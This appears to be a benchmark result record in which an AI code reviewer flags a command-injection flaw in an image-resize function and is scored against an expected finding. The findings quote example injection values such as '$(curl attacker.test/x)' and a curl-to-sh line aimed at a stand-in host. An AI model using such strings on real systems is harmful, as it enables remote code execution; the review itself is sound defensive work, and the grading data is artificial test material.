@@ -1,0 +1,108 @@
+{
+  "case": "C070",
+  "pr": "C070",
+  "repo": "fixture",
+  "provider": "grok",
+  "endpoint_kind": "xai",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "0c26652cd134",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 50.2,
+  "setup_seconds": 0.0,
+  "total_seconds": 50.3,
+  "usage": {
+    "in": 17509,
+    "cache_read": 101248,
+    "cache_write": 0,
+    "out": 2616,
+    "source": "cli"
+  },
+  "cost_usd": 0.0810884,
+  "changed_files": [
+    "src/images/resize.ts"
+  ],
+  "findings": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity": "critical",
+      "body": "**Issue:** `exec()` runs the command through a shell, and `src` / `filter` are interpolated directly into that string. The comment and PR text say filters are user-composed, so any caller-supplied value becomes shell syntax.\n\n**Failure mode:** `filter` is unquoted, so a value such as `Lanczos; id > /tmp/pwned` or `$(curl attacker.test/x)` executes arbitrary commands. `src` is only double-quoted, so `\"`, `$()`, and backticks still break out or expand. This replaces the previous safe `execFile` argv form.\n\n**Fix:** Keep a non-shell spawn and pass arguments as a list; allowlist filter names if they are user-facing:\n\n```ts\nimport { execFile } from \"child_process\";\n\nconst ALLOWED = new Set([\"Lanczos\", \"Mitchell\", \"Catrom\", \"Point\", \"Box\"]);\n\nexport function resize(src: string, filter: string, w: number): Promise<string> {\n  if (!ALLOWED.has(filter)) return Promise.reject(new Error(\"invalid filter\"));\n  return new Promise((res, rej) => {\n    execFile(\"convert\", [src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"], (e) =>\n      e ? rej(e) : res(\"/tmp/out.png\")\n    );\n  });\n}\n```\n\nDo not use `exec` or string concatenation for this boundary."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity": "warning",
+      "body": "**Issue:** `resize(src, w)` becomes `resize(src, filter, w)` \u2014 a new required parameter is inserted before `w`.\n\n**Failure mode:** Existing TypeScript callers pass a width as the second argument; that value is then treated as `filter` and the width shifts, causing type errors and/or wrong runtime behavior at every call site.\n\n**Fix:** Append the new parameter (`resize(src, w, filter?)`) with a safe default (e.g. `Lanczos`), or ship an explicitly named-options API so existing positional callers keep working."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a critical command-injection vulnerability by switching from `execFile` to shell `exec` and interpolating caller-controlled values into the command string.\n\n## Analysis\n\n`resize` previously invoked ImageMagick safely via `execFile` with an argv array (no shell). The new implementation builds a single shell string:\n\n```ts\nexec(`convert \"${src}\" -filter ${filter} -resize ${w}x /tmp/out.png`, ...)\n```\n\nBoth `src` and `filter` are typed as plain `string` with no validation or allowlist. The PR description and inline comment state that filter expressions are **user-composed**, so this is intentionally untrusted input on a shell boundary.\n\n**Failure modes (concrete):**\n- `filter` is unquoted \u2014 values like `Lanczos; curl http://evil/$(whoami)|sh` or `` `id` `` run arbitrary commands as the process user.\n- `src` is only double-quoted \u2014 embedded `\"`, `$()`, or backticks still break out or expand under `/bin/sh`.\n- `w` is interpolated unquoted; a non-number at runtime similarly affects the shell parse.\n\nThe rationale that \u201c`-filter` needs a shell\u201d is incorrect. ImageMagick accepts filter names as normal argv tokens; keep `execFile`/`spawn` with something like `[\"convert\", src, \"-filter\", filter, \"-resize\", `${w}x`, \"/tmp/out.png\"]`, and validate `filter` against an allowlist of known filters if the surface is user-facing.\n\nSecondary concern: inserting required `filter` as the second parameter changes the public call signature (`(src, w)` \u2192 `(src, filter, w)`), which will break existing callers at compile time.\n\n**Recommendation:** request-changes\n",
+  "round": "full",
+  "effective_max_turns": 20,
+  "budget": {
+    "tier": "standard",
+    "profile": "auto",
+    "turns": 20,
+    "alias": "balanced",
+    "model": "grok-4.5",
+    "output_tokens": 8192,
+    "verifier_warning_pct": 30,
+    "patch_bytes": 120000,
+    "native_cap_applied": true
+  },
+  "prior_finding_updates": {},
+  "prior_findings_kept": [],
+  "outstanding_verdicts": [],
+  "verification": [
+    {
+      "path": "src/images/resize.ts",
+      "line": 6,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head code runs `exec()` with `filter` unquoted and `src` only double-quoted in a shell string, replacing base\u2019s safe `execFile` argv form; the comment states filters are user-composed, so this is real command injection at critical severity."
+    },
+    {
+      "path": "src/images/resize.ts",
+      "line": 3,
+      "severity_claimed": "warning",
+      "status": "skipped",
+      "reason": "not sampled"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 10.804,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 3236,
+      "out": 395
+    },
+    "cost_usd": 0.009789
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C070-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 0,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
